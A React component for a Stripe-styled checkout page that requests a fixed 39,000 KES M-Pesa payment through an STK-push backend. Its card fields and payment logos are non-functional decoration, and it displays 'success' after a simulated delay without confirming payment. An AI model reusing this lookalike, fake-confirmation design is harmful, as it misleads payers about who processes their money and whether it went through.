import React, { useState, useEffect } from 'react';
import './StripeLikePage.css';
import visaImage from './assets/amazon.png';
import mastercardImage from './assets/mastercard.png';
import card from './assets/eway.png';
import paycard from './assets/ebay.png';
import applePayImage from './assets/applepay.png';
import { FaCheckCircle, FaTimesCircle, FaRedo } from 'react-icons/fa';

// Success Dialog Component
const SuccessDialog = ({ onClose, countdown, amountUSD, amountKES, email }) => (
  <div className="dialog-overlay">
    <div className="dialog-box success-dialog">
      <div className="dialog-icon">
        <FaCheckCircle className="success-icon" />
      </div>
      <h3>Payment Request Successful sent!</h3>
      <p>Check your phone to complete the payment</p>
      <p>We will keep a receipt of your payment</p>
      <p>Check your phone for M-Pesa confirmation message  after completing transaction</p>
      <div className="dialog-countdown">
        Closing in {countdown} seconds...
      </div>
      <button 
        onClick={onClose}
        className="dialog-button success-button"
      >
        OK
      </button>
    </div>
  </div>
);

// Error Dialog Component
const ErrorDialog = ({ onRetry, errorMessage, countdown }) => (
  <div className="dialog-overlay">
    <div className="dialog-box error-dialog">
      <div className="dialog-icon">
        <FaTimesCircle className="error-icon" />
      </div>
      <h3>Payment Failed</h3>
      <p className="error-message">{errorMessage}</p>
      <div className="dialog-countdown">
        Closing in {countdown} seconds...
      </div>
      <button 
        onClick={onRetry}
        className="dialog-button error-button"
      >
        <FaRedo className="retry-icon" /> Try Again
      </button>
    </div>
  </div>
);

function Card({ children }) {
  return <div className="card">{children}</div>;
}

export default function StripeLikePage() {
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    phone: '',
    cardNumber: '•••• •••• •••• 4242',
    expiry: '••/••',
    cvc: '•••'
  });
  const [paymentStatus, setPaymentStatus] = useState(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [countdown, setCountdown] = useState(10);
  const fixedAmountUSD = 300;
  const fixedAmountKES = 39000;

  // Auto-redirect after 10 seconds
  useEffect(() => {
    let timer;
    if (paymentStatus === 'success' || paymentStatus === 'error') {
      timer = setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            resetForm();
            return 10;
          }
          return prev - 1;
        });
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [paymentStatus]);

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    setPaymentStatus('processing');
    setErrorMessage('');
    setCountdown(10);

    try {
      let phone = formData.phone.replace(/\D/g, '');
      if (phone.startsWith('0') && phone.length === 10) {
        phone = `254${phone.substring(1)}`;
      } else if (phone.startsWith('7') && phone.length === 9) {
        phone = `254${phone}`;
      } else if (!(phone.startsWith('254') && phone.length === 12)) {
        throw new Error('Please enter a valid Kenyan phone number (e.g., 0712345678 or 254712345678)');
      }

      const payload = {
        phoneNumber: phone,
        amount: fixedAmountKES
      };

      console.log('Sending STK request:', payload);

      const response = await fetch('https://till-r74x.onrender.com/api/stk', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });

      const result = await response.json();
      console.log('STK Response:', result);

      if (!response.ok) {
        throw new Error(result.error || result.message || 'Payment request failed');
      }

      // ✅ Updated handling of STK push response
      const isStkPushInitiated =
        result.message?.toLowerCase().includes('stk push request sent successfully') ||
        result.responseDescription?.toLowerCase().includes('request accepted');

      if (isStkPushInitiated) {
        setPaymentStatus('processing');

        // Simulate backend confirmation after a short wait
        setTimeout(() => {
          setPaymentStatus('success');
        }, 7000); // simulate 7s for user to approve
      } else {
        throw new Error(result.error || result.message || result.responseDescription || 'STK Push failed. Please try again.');
      }
    } catch (err) {
      console.error('Payment error:', err.message);
      setPaymentStatus('error');
      setErrorMessage(err.message);
    } finally {
      setIsSubmitting(false);
    }
  };

  const resetForm = () => {
    setPaymentStatus(null);
    setCountdown(10);
  };

  const retryPayment = () => {
    setPaymentStatus(null);
    setCountdown(10);
  };

  return (
    <div className="stripe-container">
      <div className="stripe-header">
        <h1>Complete your purchase</h1>
        <div className="payment-amount">${fixedAmountUSD.toFixed(2)}</div>
      </div>
      
      <div className="stripe-content">
        <Card>
          {paymentStatus === null ? (
            <form onSubmit={handleSubmit}>
              <div className="form-group">
                <label htmlFor="name">Full Name</label>
                <input 
                  type="text" 
                  id="name" 
                  name="name" 
                  value={formData.name} 
                  onChange={handleChange} 
                  required 
                />
              </div>
              
              <div className="form-group">
                <label htmlFor="email">Email</label>
                <input 
                  type="email" 
                  id="email" 
                  name="email" 
                  value={formData.email} 
                  onChange={handleChange} 
                  required 
                />
              </div>
              
              <div className="form-group">
                <label htmlFor="phone">M-Pesa Phone Number</label>
                <input 
                  type="tel" 
                  id="phone" 
                  name="phone" 
                  value={formData.phone} 
                  onChange={handleChange} 
                  placeholder="07XX XXX XXX" 
                  pattern="[0-9]{9,12}"
                  title="Enter a valid Kenyan phone number (e.g., 0712345678 or 254712345678)"
                  required 
                />
                <small className="hint">Enter your M-Pesa registered phone number (e.g., 0712345678)</small>
              </div>
              
              <div className="payment-methods">
                <h3>Payment Method</h3>
                
                <div className="apple-pay-container">
                  <img 
                    src={applePayImage} 
                    alt="Apple Pay" 
                    className="apple-pay-button"
                  />
                  <div className="payment-method-divider">
                    <span>or pay with M-Pesa</span>
                  </div>
                </div>
                
                <div className="payment-details">
                  <div className="form-group">
                    <label>Card Information</label>
                    <div className="card-input-wrapper">
                      <input 
                        type="text" 
                        value={formData.cardNumber} 
                        readOnly
                        className="card-input read-only-input"
                      />
                      <div className="card-brand-icons">
                        <img src={visaImage} alt="Visa" className="card-brand-icon" />
                        <img src={mastercardImage} alt="Mastercard" className="card-brand-icon" />
                        <img src={card} alt="Card" className="card-brand-icon" />
                        <img src={paycard} alt="Paycard" className="card-brand-icon" />
                      </div>
                    </div>
                  </div>
                  
                  <div className="form-row">
                    <div className="form-group half">
                      <label>Expiry Date</label>
                      <input 
                        type="text" 
                        value={formData.expiry} 
                        readOnly
                        className="read-only-input"
                      />
                    </div>
                    
                    <div className="form-group half">
                      <label>CVC</label>
                      <input 
                        type="text" 
                        value={formData.cvc} 
                        readOnly
                        className="read-only-input"
                      />
                    </div>
                  </div>
                </div>
              </div>
              
              <button 
                type="submit" 
                className="submit-button"
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Sending STK Push...' : `Pay $${fixedAmountUSD.toFixed(2)} (${fixedAmountKES.toLocaleString()} KES)`}
              </button>
            </form>
          ) : paymentStatus === 'processing' ? (
            <div className="payment-result processing">
              <div className="loading-spinner"></div>
              <h3>Processing Payment...</h3>
              <p>Please wait while we initiate the M-Pesa payment</p>
              <p>You will receive an STK push on your phone shortly</p>
            </div>
          ) : null}
        </Card>
      </div>

      {paymentStatus === 'success' && (
        <SuccessDialog
          onClose={resetForm}
          countdown={countdown}
          amountUSD={fixedAmountUSD}
          amountKES={fixedAmountKES}
          email={formData.email}
        />
      )}

      {paymentStatus === 'error' && (
        <ErrorDialog
          onRetry={retryPayment}
          errorMessage={errorMessage}
          countdown={countdown}
        />
      )}
    </div>
  );
}
